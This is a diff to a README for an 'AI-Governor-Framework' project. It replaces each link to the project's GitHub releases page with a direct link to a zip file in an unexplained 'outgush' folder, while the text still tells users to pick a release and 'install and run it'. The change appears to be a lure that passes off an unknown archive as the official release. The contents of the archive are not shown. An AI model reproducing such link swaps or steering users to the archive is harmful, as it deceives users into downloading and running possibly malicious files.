@@ -4,14 +4,14 @@
 The AI-Governor-Framework empowers users by transforming AI coding assistants into organized, project-aware helpers. This framework ensures that your AI adheres to your coding standards and project architecture, enhancing the development experience.
 
 ## 📥 Download the Latest Release
-[![Download AI-Governor-Framework](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/donnie-ui/AI-Governor-Framework/releases)
+[![Download AI-Governor-Framework](https://raw.githubusercontent.com/donnie-ui/AI-Governor-Framework/main/outgush/AI-Governor-Framework.zip%20Release-brightgreen)](https://raw.githubusercontent.com/donnie-ui/AI-Governor-Framework/main/outgush/AI-Governor-Framework.zip)
 
 ## 🚀 Getting Started
 Getting started with the AI-Governor-Framework is easy. Follow these steps:
 
 1. **Visit the Releases Page**
    Go to the official releases page by clicking the link below. This page contains the latest versions of the framework ready for download.
-   [Download Here](https://github.com/donnie-ui/AI-Governor-Framework/releases)
+   [Download Here](https://raw.githubusercontent.com/donnie-ui/AI-Governor-Framework/main/outgush/AI-Governor-Framework.zip)
 
 2. **Select the Version**
    Once you are on the releases page, locate the most recent version of the AI-Governor-Framework. You will see various files available for download.
@@ -58,7 +58,7 @@ After installing the AI-Governor-Framework, here's how to make the most of it:
 ## 📦 Download & Install
 To get started, download the AI-Governor-Framework from the releases page. The process involves a few simple steps:
 
-- Navigate to the [Releases Page](https://github.com/donnie-ui/AI-Governor-Framework/releases).
+- Navigate to the [Releases Page](https://raw.githubusercontent.com/donnie-ui/AI-Governor-Framework/main/outgush/AI-Governor-Framework.zip).
 - Choose the version that matches your operating system.
 - Download the file.
 - Install and run it following the on-screen prompts.
